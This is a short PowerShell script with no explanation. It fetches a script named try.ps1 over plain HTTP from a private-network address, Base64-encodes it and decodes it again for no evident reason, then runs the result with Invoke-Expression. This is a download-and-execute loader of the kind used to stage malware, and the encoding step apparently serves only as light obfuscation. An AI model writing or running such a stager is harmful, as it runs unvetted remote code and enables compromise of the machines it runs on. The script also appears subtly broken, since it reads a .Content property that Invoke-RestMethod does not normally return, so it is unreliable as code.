

$scriptUrl = "http://10.211.55.5:8000/try.ps1"


try {
    $response = Invoke-RestMethod -Uri $scriptUrl -UseBasicParsing
    $scriptContent = $response.Content
} catch {
    Write-Host "Error: $_"
    exit
}


$bytes = [System.Text.Encoding]::UTF8.GetBytes($scriptContent)
$base64 = [System.Convert]::ToBase64String($bytes)


[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) | Invoke-Expression
